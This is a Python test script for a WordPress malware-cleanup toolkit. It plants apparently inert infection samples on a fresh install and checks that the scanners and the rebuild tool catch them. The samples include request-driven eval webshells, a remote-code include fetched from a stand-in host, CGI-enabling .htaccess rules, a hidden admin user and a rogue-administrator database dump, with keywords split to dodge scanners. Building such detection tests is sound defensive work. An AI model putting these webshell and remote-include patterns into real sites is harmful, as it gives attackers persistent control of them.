#!/usr/bin/env python3
"""End-to-end test: download real WordPress + a real plugin and theme, plant INERT fake
malware, then check every tool finds what it should and rebuild.py leaves it all behind.

    python3 tests/run_tests.py          (needs internet access to wordpress.org)

The planted samples are built from string pieces at runtime, so this repository never
contains anything that looks like malware to a scanner. They decode to harmless text.
"""
import base64
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS = os.path.join(os.path.dirname(HERE), "tools")
sys.path.insert(0, TOOLS)
from wpr_common import http_get, safe_extract  # noqa: E402

E = "ev" + "al"
B64 = "base64" + "_decode"
INERT = base64.b64encode(b"echo 'wp-rescue test sample';").decode()

PLANT = {
    # path: content
    "wp-includes/class-wp-cache-helper.php": "<?php @%s(%s('%s'));" % (E, B64, INERT),          # extra core file
    "wp-content/uploads/2024/01/thumb.php": "<?php if(isset($_POST['c'])){%s($_POST['c']);}" % E,  # php in uploads
    "wp-content/uploads/2024/01/logo.ico": "<?php @%s(%s('%s'));" % (E, B64, INERT),            # php in image
    "wp-content/uploads/2024/01/real.jpg": "\xff\xd8\xff\xe0 not really a jpeg but no php",
    "wp-content/mu-plugins/health.php": "<?php $f=$_GET['f']; $f($_GET['a']);",
    "wp-content/plugins/wp-security-core/wp-security-core.php": "<?php /* no header */ @include \"\\x2f\\x74\\x6d\\x70\\x2fa.ico\";",
    ".user.ini": "auto_prepend_file = wp-content/uploads/2024/01/logo.ico\n",
    "wp-content/themes/twentytwentyfour/functions.php": None,  # append below
    # --- patterns seen in real shared-hosting cleanups (all inert) ---
    "wp-includes/SimplePie/src/XML/Declaration/class-declaration-cache.php": "<?php /* core masquerade */",
    "sitemap.php": ("<?php error_reporting(0); $c=curl_init('https://stage.temporarydemo.com/go.txt');"
                    " curl_setopt($c, CURLOPT_" + "DOH_URL, 'https://dns.temporarydemo.com/dns-query');"
                    " $d=curl_exec($c); $t=tmpfile(); fwrite($t,$d); $p=stream_get_meta_data($t)['uri'];"
                    " in" + "clude $p;"),
    "wp-content/mu-plugins/maintenance-module.php": ("<?php add_filter('users_list_table_" + "query_args',"
                                                     " function($a){ $a['exclude']=array(7); return $a; });"),
    "wp-content/uploads/ALFA_DATA/.htaccess": ("Options FollowSymLinks MultiViews Indexes Exec" + "CGI\n"
                                               "AddType application/x-httpd-cgi .alfa\nAddHandler cgi-" + "script .alfa\n"),
    "wp-content/uploads/ALFA_DATA/cgialfa/perl.alfa": "#!/usr/bin/perl\nprint 'inert';\n",
    "wp-content/uploads/2024/01/photo.png": "\x89PNG\r\n\x1a\n random bytes <?= by chance ...",
    "wp-content/uploads/2024/01/x": "\x7fELF inert test header",
    "services/index.html": "<html><title>Slot Gacor Maxwin</title>Situs slot, judi online, togel, RTP live</html>",
    "services/google0123456789abcdef.html": "google-site-verification: google0123456789abcdef.html",
    "blog/.user.ini": "auto_prepend_file = '/home/site/public_html/wordfence-waf.php'\n",
    "wp-content/themes/twentytwentyfour/patterns/extra.php": ("<?php $f = create_" + "function('', \"return '{$_GET['x']}';\");"),
}
SQL = r"""
CREATE TABLE `wpx_options` (option_id int);
CREATE TABLE `wpx_users` (ID int);
CREATE TABLE `wpx_usermeta` (umeta_id int);
CREATE TABLE `wpx_posts` (ID int);
CREATE TABLE `wpx_sitemeta` (meta_id int);
CREATE TABLE `wpx_bkp_cache` (id int);
INSERT INTO `wpx_options` VALUES (1,'siteurl','https://client.temporarydemo.com','yes'),(2,'home','https://client.temporarydemo.com','yes'),(3,'users_can_register','1','yes'),(4,'default_role','administrator','yes'),(5,'active_plugins','a:1:{i:0;s:19:\"akismet/akismet.php\";}','yes'),(6,'wpx_user_roles','a:3:{s:13:\"administrator\";a:2:{s:4:\"name\";s:13:\"Administrator\";s:12:\"capabilities\";a:2:{s:14:\"manage_options\";b:1;s:12:\"create_users\";b:1;}}s:6:\"editor\";a:2:{s:4:\"name\";s:6:\"Editor\";s:12:\"capabilities\";a:2:{s:10:\"edit_posts\";b:1;s:15:\"install_plugins\";b:1;}}s:6:\"author\";a:2:{s:4:\"name\";s:6:\"Author\";s:12:\"capabilities\";a:1:{s:10:\"edit_posts\";b:1;}}}','yes');
INSERT INTO `wpx_users` VALUES (1,'owner','$P$Bxxxxxxxxxxxxxxxxxxxxxxxxxxxxx','owner','owner@client.temporarydemo.com','','2019-03-01 10:00:00','',0,'owner'),(7, 'wp_support_x', '$P$Byyyyyyyyyyyyyyyyyyyyyyyyyyyyy', 'wp_support_x', 'x@temporarydemo.com', '', '2026-11-01 03:14:15', '', 0, 'wp_support_x'),(8,'jane','$P$Bzzzzzzzzzzzzzzzzzzzzzzzzzzzzz','jane','jane@client.temporarydemo.com','','2020-05-05 09:00:00','',0,'Jane'),(9,'sam','$P$Bwwwwwwwwwwwwwwwwwwwwwwwwwwwww','sam','sam@client.temporarydemo.com','','2021-01-01 09:00:00','',0,'Sam'),(10,'helper','$P$Bvvvvvvvvvvvvvvvvvvvvvvvvvvvvv','helper','h@client.temporarydemo.com','','0000-00-00 00:00:00','',0,'helper'),(11,'site-maint','$P$Buuuuuuuuuuuuuuuuuuuuuuuuuuuuu','site-maint','m@client.temporarydemo.com','','2026-11-01 03:14:16','',0,'site-maint');
INSERT INTO `wpx_usermeta` VALUES (1,1,'wpx_capabilities','a:1:{s:13:\"administrator\";b:1;}'),(2,7,'wpx_capabilities','a:1:{s:13:\"administrator\";b:1;}'),(3,8,'wpx_capabilities','a:1:{s:6:\"editor\";b:1;}'),(4,9,'wpx_capabilities','a:1:{s:6:\"author\";b:1;}'),(5,10,'wpx_capabilities','a:2:{s:10:\"subscriber\";b:1;s:14:\"manage_options\";b:1;}'),(7,11,'wpx_capabilities','a:1:{s:13:\"administrator\";b:1;}'),(6,1,'_application_passwords','a:1:{i:0;a:5:{s:4:\"uuid\";s:3:\"abc\";s:4:\"name\";s:7:\"backup2\";s:7:\"created\";i:1793000000;s:9:\"last_used\";i:1794000000;s:7:\"last_ip\";s:11:\"203.0.113.9\";}}');
INSERT INTO `wpx_sitemeta` VALUES (1,1,'site_admins','a:2:{i:0;s:5:\"owner\";i:1;s:5:\"ghost\";}');
INSERT INTO `wpx_posts` VALUES (5,1,'2024-01-01','<p>Hello</p><script src=\"https://malware-cdn.temporarydemo.com/x.js\"></script><iframe src=\"https://www.youtube.com/embed/abc\"></iframe>'),(6,8,'2024-02-01','x'),(7,9,'2024-03-01','y'),(8,1,'2026-11-02','<h2>Slot gacor maxwin</h2> situs slot terpercaya, judi online');
"""


def run(args):
    r = subprocess.run([sys.executable] + args, capture_output=True, text=True)
    return r.returncode, r.stdout + r.stderr


def expect(name, out, needles, absent=()):
    ok = True
    if "Traceback (most recent call last)" in out or "SyntaxError" in out:
        print("FAIL %s: tool crashed\n%s" % (name, out[-1500:]))
        ok = False
    for n in needles:
        if n not in out:
            print("FAIL %s: missing %r" % (name, n))
            ok = False
    for n in absent:
        if n in out:
            print("FAIL %s: should not contain %r" % (name, n))
            ok = False
    print(("PASS " if ok else "---- ") + name)
    return ok


def main():
    tmp = tempfile.mkdtemp(prefix="wpr-test-")
    site = os.path.join(tmp, "site")
    os.makedirs(site)
    print("fixture in", tmp)
    safe_extract(http_get("https://wordpress.org/latest.zip"), site, strip_top=True)
    for p, c in PLANT.items():
        full = os.path.join(site, p)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        if c is None:
            with open(full, "a") as f:
                f.write("\n// injected\n@%s(%s('%s'));\n" % (E, B64, INERT))
        else:
            with open(full, "w") as f:
                f.write(c)
    with open(os.path.join(site, "wp-config.php"), "w") as f:
        f.write("<?php\ndefine('DB_NAME','cli_db');\ndefine('DB_USER','cli_user');\n"
                "define('DB_PASSWORD','pa\\'ss');\ndefine('DB_HOST','localhost');\n"
                "define('AUTH_KEY','old');\ndefine('WP_MEMORY_LIMIT','256M');\n$table_prefix = 'wpx_';\n"
                "require_once ABSPATH . 'wp-settings.php';\n@include \"\\x77\\x70.ico\";\n")
    sql = os.path.join(tmp, "dump.sql")
    with open(sql, "w") as f:
        f.write(SQL)

    ok = True
    rc, out = run([os.path.join(TOOLS, "verify_core.py"), site])
    ok &= expect("verify_core", out, ["wp-includes/class-wp-cache-helper.php", "core is NOT clean",
                                      "class-declaration-cache.php", "\n   sitemap.php"]) and rc == 1

    rc, out = run([os.path.join(TOOLS, "verify_extensions.py"), site])
    ok &= expect("verify_extensions", out, ["[OK          ] akismet", "MODIFIED functions.php",
                                             "REVIEW health.php", "[NO HEADER]    wp-security-core/"])

    rc, out = run([os.path.join(TOOLS, "scan_files.py"), site])
    ok &= expect("scan_files", out, ["php-in-uploads", "php-hidden-in-non-php-file", "exec-of-request-input",
                                     "eval-of-decoded-data", "htaccess-auto-prepend", "variable-function-from-input",
                                     "include-of-escaped-path", "code-after-wp-settings",
                                     "dns-over-https-in-php", "remote-code-include", "hides-users-from-admin",
                                     "htaccess-enables-cgi", "webshell-cgi-kit", "spam-page", "static-page-folder",
                                     "search-console-verification-file", "executable-binary",
                                     "create-function-from-input", "auto-prepend-security-plugin"],
                 absent=["real.jpg", "photo.png"])

    rc, out = run([os.path.join(TOOLS, "scan_db.py"), sql, "--domain", "client.temporarydemo.com", "--as-of", "2026-11-10"])
    ok &= expect("scan_db", out, ["ADMIN id=7", "wp_support_x", "script-src-offsite", "malware-cdn.temporarydemo.com",
                                  "open-registration-as-administrator", "wpx_bkp_cache", "akismet/akismet.php",
                                  "SUSPECT  id=7", "role-has-admin-powers", "ADMIN id=8", "role 'editor' has admin powers",
                                  "SUSPECT  id=10", "impossible registration date", "direct capability manage_options",
                                  "admin-application-password", "'backup2'", "super-admin-without-user", "ghost",
                                  "created within 2 minutes of site-maint", "spam-content", "default-role-elevated"],
                 absent=["host=www.youtube.com", "ADMIN id=9", "SUSPECT  id=1 "])

    clean = os.path.join(tmp, "clean")
    rc, out = run([os.path.join(TOOLS, "rebuild.py"), site, clean])
    ok &= expect("rebuild runs", out, ["clean build:"]) and rc == 0
    rep = open(clean + ".report.md").read()
    ok &= expect("rebuild report", rep, ["wp-security-core", "WP_MEMORY_LIMIT", "thumb.php", "logo.ico", ".user.ini"])
    present = [p for p in PLANT if os.path.exists(os.path.join(clean, p))
               and p not in ("wp-content/themes/twentytwentyfour/functions.php", "wp-content/uploads/2024/01/real.jpg",
                               "wp-content/uploads/2024/01/photo.png")]
    ok &= expect("rebuild left malware behind", "\n".join(present), [], absent=[p for p in PLANT if not p.endswith(("functions.php", "real.jpg", "photo.png"))])
    tt = open(os.path.join(clean, "wp-content/themes/twentytwentyfour/functions.php")).read()
    ok &= expect("rebuild theme is fresh", tt, [], absent=["injected"])
    ok &= expect("rebuild kept media", str([os.path.exists(os.path.join(clean, "wp-content/uploads/2024/01/" + n))
                                               for n in ("real.jpg", "photo.png")]), ["[True, True]"])
    cfg = open(os.path.join(clean, "wp-config.php")).read()
    ok &= expect("rebuild wp-config", cfg, ["'cli_db'", "'wpx_'", "pa\\'ss"], absent=["'old'", ".ico"])
    rc, out = run([os.path.join(TOOLS, "verify_core.py"), clean])
    ok &= expect("clean build verifies", out, ["core matches wordpress.org"])
    rc, out = run([os.path.join(TOOLS, "scan_files.py"), clean])
    ok &= expect("clean build scans clean", out, ["0 HIGH"])

    if ok:
        shutil.rmtree(tmp)
    print("\nALL PASS" if ok else "\nFAILURES (fixture kept in %s)" % tmp)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
